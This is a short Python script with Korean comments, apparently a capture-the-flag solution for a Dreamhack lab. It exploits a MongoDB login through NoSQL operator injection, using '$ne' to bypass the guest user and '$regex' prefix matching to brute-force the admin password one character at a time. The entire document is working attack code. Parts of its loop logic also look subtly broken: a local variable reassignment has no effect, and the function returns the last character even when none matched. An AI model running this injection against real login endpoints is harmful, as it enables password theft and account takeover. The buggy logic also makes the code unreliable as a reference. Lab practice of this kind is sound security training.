'''
- object 형태로 인자를 넘겨서 비밀번호를 하나씩 대입함
- 만약 해당 문자열로 시작한다면 true를 리턴하기 때문에 비밀번호를 유추할 수 있음
'''
from string import ascii_letters
import requests

ascii_letters='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

def url(password):
    params={'uid[$ne]' : 'guest', 'upw[$regex]' : password} # mongodb 조건인자 활용
    r = requests.get("http://host3.dreamhack.games:22868/login", params=params)
    return r

def comp(flag):
    for i in ascii_letters:
        ch = flag + '[' + i + ']'
        if "admin" in url(ch).text :
            flag = '[' + i + ']'
            break
    return i

if __name__ == '__main__':
    flag='[D]H{'
    for l in range(1,33) :
        flag += comp(flag)
        print(flag + "}")